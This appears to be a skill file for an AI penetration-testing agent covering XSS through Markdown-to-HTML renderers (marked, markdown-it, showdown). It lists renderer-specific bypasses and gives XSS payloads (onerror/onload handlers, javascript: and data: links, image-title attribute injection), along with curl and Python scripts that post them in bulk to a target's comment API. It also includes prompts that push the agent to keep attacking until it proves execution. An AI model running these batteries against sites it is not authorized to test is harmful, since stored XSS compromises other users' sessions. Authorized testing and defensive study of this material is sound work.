---
name: markdown_render_xss
agent: agent6_xss
description: Markdown-to-HTML pipelines — renderer-specific bypasses in marked, markdown-it, and friends.
---

# Markdown Render XSS

## Purpose

Every comment box, README renderer, chat message, ticket description, and docs page that accepts Markdown runs a Markdown→HTML pipeline — and every pipeline has opinions about raw HTML, link schemes, and attribute injection. `marked`, `markdown-it`, `showdown`, `commonmark`, and `mistune` each fail differently: one passes raw HTML through, another allows `javascript:` links, a third lets you smuggle event handlers through image titles. This skill fingerprints the exact renderer and version, tests raw-HTML passthrough, link/image scheme handling, and renderer-specific bypasses, then proves execution in the real render path. Markdown renderers are where "we sanitize user input" meets "but the feature needs rich text" — that tension is the vulnerability.

## Division of labor

- **Consumes:** `findings/surface_inputs.txt` (every Markdown-accepting field: comments, bios, tickets, chat, docs), `findings/stored_xss_chain.md` (Markdown fields are usually stored — the render paths matter), the app's JS bundles (client-side renderers leave fingerprints).
- **Produces:** the finished artifact — `findings/markdown_render_xss.md` — renderer fingerprint, the full bypass battery results per field, and execution proof. Test vectors under `evidence/markdown_render_xss/`.

## When to use / when NOT to use

- **Use when:** any user input is rendered as Markdown/HTML — comments, reviews, bios, ticket bodies, chat, wikis, docs, READMEs, email templates with Markdown.
- **Use when:** you see renderer fingerprints in JS (`marked(`, `markdownit(`, `showdown.Converter`, `micromark`) or server headers hinting at a renderer.
- **Use when:** a Markdown field reflects input with HTML-ish output (angle brackets survive, links become `<a>` tags) — the pipeline is doing something, find out what.
- **Skip when (time-pass filter):** the field provably renders as plain text (no Markdown processing at all — test with `**bold**` and `[x](y)`; if they render literally, there's no pipeline to attack). Also skip when the renderer is verified latest-version with `html: false` / sanitized output AND your full battery confirms it — document once, move on.

## Methodology

1. **Find every Markdown surface.** Submit `**boldtest**` and `[linktest](https://example.com)` to each candidate field. If the render shows bold/link HTML, it's a Markdown pipeline. Record the field, the write request, and the render path(s).
2. **Fingerprint the renderer.** Client-side: grep JS for `marked`, `markdown-it`, `showdown`, `micromark`, `remark`, `DOMPurify` chained after. Server-side: look for version leaks in HTML comments, `generator` meta tags, or distinctive output quirks (e.g. `marked` adds `id` attributes to headings; `markdown-it` has specific link rendering). Pin the version — bypasses are version-specific.
3. **Test raw HTML passthrough.** Submit `<b>rawhtmltest</b>`, `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`. If raw HTML passes through unescaped → the pipeline trusts HTML input; your `filter_behavior_analysis` alphabet now applies inside Markdown. If it's escaped → the renderer blocks raw HTML (but keep testing — link/image vectors remain).
4. **Test link scheme handling.** Submit `[click](javascript:alert(1))`, `[click](JaVaScRiPt:alert(1))`, `[click](data:text/html,<script>alert(1)</script>)`, `[click](vbscript:msgbox(1))`. Check the rendered `href`. Many renderers allowlist `http/https` only — but misconfigured ones (`linkify` with custom schemes, `validateLink` returning true) don't.
5. **Test image source vectors.** `![x](x" onerror="alert(1))`, `![x](javascript:alert(1))`, `![<svg onload=alert(1)>](x)`. Image titles and alt text are classic attribute-injection points: `![a](b "c" onload="alert(1)")`.
6. **Test reference-style links.** 
   ```
   [click][1]
   [1]: javascript:alert(1)
   ```
   Reference definitions are parsed separately from usage — some sanitizers check the usage site but not the definition.
7. **Test renderer-specific bypasses.**
   - `marked`: older versions + `sanitize: false`; heading IDs (`# <img...>`) inject attributes; `mangle` off leaks emails (minor).
   - `markdown-it`: `html: true` + `linkify: true` combos; `markdown-it` plugins (anchor, attrs) that add attributes — `markdown-it-attrs` lets you write `{#id .class}` and sometimes event handlers.
   - `showdown`: `simplifiedAutoLink`, `literalMidWordUnderscores`; metadata/header support.
   - Common: backtick code spans with unescaped content, autolinked URLs with `javascript:` (test `<javascript:alert(1)>` autolink syntax), nested emphasis breaking out of tags.
8. **Test the sanitize-after-render step.** Many pipelines do Markdown→HTML→sanitize. Identify the sanitizer (usually DOMPurify client-side or `bleach`/`nh3` server-side) and its config. If sanitization exists, the game becomes: what does the renderer EMIT that the sanitizer mishandles? Hand sanitizer-specific work to `mutation_xss` but drive the renderer side here.
9. **Test multi-stage pipelines.** Server renders Markdown→HTML, stores the HTML, client re-renders or injects it via `innerHTML`. Each stage is a bypass chance. Map the stages exactly (view-source the stored value vs the final DOM).
10. **Test Markdown in unexpected places.** Filenames rendered as Markdown, notification titles, search result snippets, email subjects (some apps Markdown-render email bodies), CSV cells imported and rendered. The weird render paths have the weakest configs.
11. **Prove execution in the real render path, 2x.** Submit the winning vector through the real field, load the real render path in a clean browser profile, screenshot the execution. Also prove persistence if the field is stored (reload, fresh session).
12. **Decision branches.**
    - If raw HTML passes through → treat the field as an HTML injection point; run the full `filter_behavior_analysis` battery inside it.
    - If only link/image schemes are abusable → the finding is narrower but real; prove the `javascript:` link executes on click (note: click-required = lower severity, still valid).
    - If the renderer is locked down but a plugin/extension adds attributes → target the plugin's syntax specifically.
    - If everything is escaped/sanitized → NEGATIVE for this field, documented with the renderer version + config.

## Exact commands

Markdown detection probes (submit to each candidate field):

```bash
mkdir -p evidence/markdown_render_xss
curl -sS -X POST "https://<TARGET>/api/comments" \
  -H "Content-Type: application/json" -H "Cookie: session=<YOUR_SESSION>" \
  -d '{"body":"**boldtest99** and [linktest99](https://example.com)"}' \
  -o evidence/markdown_render_xss/detect.json
# then load the render path and check:
curl -sS "https://<TARGET>/comments" -H "Cookie: session=<YOUR_SESSION>" --compressed \
  | grep -o '.\{30\}boldtest99.\{60\}' | head -3
```

Renderer fingerprinting:

```bash
grep -rhoE '(marked|markdown-it|showdown|micromark|remark)(@[0-9.]+)?' \
  evidence/dom_sink_audit/js/ 2>/dev/null | sort -u | head
curl -sS "https://<TARGET>/" --compressed | grep -oiE 'marked|markdown-it|showdown' | sort -u | head
```

Raw HTML passthrough battery:

```bash
for v in '<b>rawhtml1</b>' '<img src=x onerror=alert(1)>' '<svg onload=alert(1)>'; do
  curl -sS -X POST "https://<TARGET>/api/comments" \
    -H "Content-Type: application/json" -H "Cookie: session=<YOUR_SESSION>" \
    --data-urlencode "body=$v" -o /dev/null
done
curl -sS "https://<TARGET>/comments" -H "Cookie: session=<YOUR_SESSION>" --compressed \
  -o evidence/markdown_render_xss/rawhtml_render.html
grep -o 'rawhtml1\|onerror=alert(1)\|onload=alert(1)' evidence/markdown_render_xss/rawhtml_render.html | sort | uniq -c
```

Link scheme battery:

```bash
python3 - <<'EOF'
import json, urllib.request
vectors = [
  "[c1](javascript:alert(1))",
  "[c2](JaVaScRiPt:alert(1))",
  "[c3](data:text/html,<script>alert(1)</script>)",
  "[click][r1]\n\n[r1]: javascript:alert(1)",
  "![i1](x\" onerror=\"alert(1))",
  "<javascript:alert(1)>",
]
for i, v in enumerate(vectors):
    req = urllib.request.Request("https://<TARGET>/api/comments",
        data=json.dumps({"body": v}).encode(),
        headers={"Content-Type": "application/json", "Cookie": "session=<YOUR_SESSION>"})
    try: urllib.request.urlopen(req, timeout=15).read()
    except Exception as e: print(i, "post failed:", e)
    print("posted vector", i)
EOF
curl -sS "https://<TARGET>/comments" -H "Cookie: session=<YOUR_SESSION>" --compressed \
  -o evidence/markdown_render_xss/scheme_render.html
grep -oE 'href="[^"]*(javascript|data:)[^"]*"' evidence/markdown_render_xss/scheme_render.html | head -10
```

Sanitize-after-render identification:

```bash
# compare: what the server stored vs what the client renders
curl -sS "https://<TARGET>/api/comments/1" -H "Cookie: session=<YOUR_SESSION>" | head -c 2000
# if the API returns raw markdown but the page shows HTML -> client-side render; grep the renderer from the JS
```

## Completion-bias defenses

- [ ] Every Markdown-accepting field found via bold/link detection probes
- [ ] Renderer fingerprinted: exact library + version (client or server side identified)
- [ ] Raw HTML passthrough tested (3 vectors minimum)
- [ ] Link scheme battery tested (6 vectors minimum incl. reference-style)
- [ ] Image source/attribute injection tested (3 vectors minimum)
- [ ] Renderer-specific bypasses tested for the fingerprinted renderer
- [ ] Sanitize-after-render step identified (library + config) or confirmed absent
- [ ] Multi-stage pipeline mapped (stored value vs final DOM compared)
- [ ] Markdown tested in unexpected render paths (filenames, notifications, emails)
- [ ] Execution proved in the real render path 2x with screenshots
- [ ] Persistence verified for stored fields (fresh session reload)
- [ ] `findings/markdown_render_xss.md` exists with fingerprint + battery + proof
- [ ] **Review step:** agent10_review must verify: (a) the renderer version is evidenced not guessed, (b) every vector was submitted through the real field (not just theorized), (c) execution proof is 2x with screenshots, (d) click-required vectors are marked as such (severity accuracy).
- [ ] **Nudge prompts:**
  - "Keep going until every Markdown field has been through the full battery — the docs page renderer and the comment renderer are different code."
  - "Do not report done before findings/markdown_render_xss.md exists with 2x execution proof."
  - "A javascript: link that needs a click is still XSS. Prove the click executes it."
- [ ] **Finished artifact definition:** `findings/markdown_render_xss.md` — per field: renderer fingerprint, every vector tested with the rendered output, and 2x browser execution proof for winners. Existence + proof IS done.

## Evidence standard

- Baseline: the `**bold**`/`[link](url)` detection render (proves the pipeline exists and shows its normal output shape).
- Reproduction: winning vector executed 2x in clean browser profiles.
- Raw evidence: submitted vectors, rendered HTML per battery, renderer fingerprint evidence, screenshots.
- Verdicts: CONFIRMED (execution in the real render path, 2x) / INCONCLUSIVE (renderer fingerprinted but execution blocked by an untested condition) / NEGATIVE (locked-down renderer + full battery clean — version/config documented).

## Handoffs

- `filter_behavior_analysis`: when raw HTML passes through, the filter alphabet applies inside Markdown — share vectors.
- `mutation_xss`: owns sanitize-after-render bypasses; this skill drives the renderer side.
- `stored_xss_chain`: Markdown fields are usually stored — winning vectors feed the stored chain's render-path mapping.
- agent10_review: consumes `findings/markdown_render_xss.md` plus screenshots.
